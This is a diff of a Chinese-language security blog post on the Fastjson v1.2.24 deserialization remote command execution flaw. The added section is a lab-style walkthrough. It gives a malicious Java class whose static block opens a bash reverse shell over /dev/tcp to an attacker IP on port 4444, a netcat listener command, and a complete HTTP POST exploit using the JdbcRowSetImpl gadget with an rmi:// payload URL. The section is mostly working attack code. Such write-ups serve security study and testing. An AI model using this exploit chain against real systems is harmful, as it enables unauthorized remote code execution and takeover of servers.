@@ -1,8 +1,8 @@
 ---
 layout: post
-title: Fastjsonv1.2.24远程命令执行
+title: Fastjson v1.2.24远程命令执行
 categories: [安全漏洞]
-description: Fastjsonv1.2.24远程命令执行
+description: Fastjson v1.2.24远程命令执行
 
 keywords: 安全漏洞, fastjson
 ---
@@ -142,3 +142,74 @@ Content-Length: 137
 **响应：**
 
 ![](https://img-blog.csdnimg.cn/e30d605ff7e146f2a12959ce2561f585.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQmlnJkJpcmQ=,size_20,color_FFFFFF,t_70,g_se,x_16)
+
+
+4. 检验结果
+   
+进入靶机中，发现`创建了/tmp/EDI 文件`攻击成功
+
+
+
+## 反弹shell
+
+既然能创建文件，那么也可以反弹shell
+修改**恶意类文件 TouchFile.java :**
+
+```
+// TouchFile.java
+// javac TouchFile.java
+import java.lang.Runtime;
+import java.lang.Process;
+ 
+public class TouchFile {
+   static {
+       try {
+           Runtime r = Runtime.getRuntime();
+           Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/<攻击机器IP>/4444 0>&1"});
+           p.waitFor();
+       } catch (Exception e) {
+           // do nothing
+       }
+   }
+}
+```
+
+然后 `javac TouchFile.java `编译一下，生成 `TouchFile.class`
+
+#### nc 监听:
+
+nc -lvvp 4444
+
+访问 FastJson 页面，使用 Burp 抓包，改为 POST 请求，使用 exp 反弹 shell
+
+**exp:**
+
+```
+POST / HTTP/1.1
+Host: 192.168.42.200:8090
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,hr;q=0.8,ru;q=0.7
+Cookie: Hm_lvt_bc38887aa5588add05a38704342ad7e8=1646619039; 
+Connection: close
+Content-Type: application/json
+Content-Length: 137
+
+{
+ "b":{
+ "@type":"com.sun.rowset.JdbcRowSetImpl",
+ "dataSourceName":"rmi://192.168.42.200:9999/TouchFile",
+ "autoCommit":true
+ }
+}
+```
+
+
+可以看到请求成功，加载了恶意类,成功拿到 shell
+
+
+
+
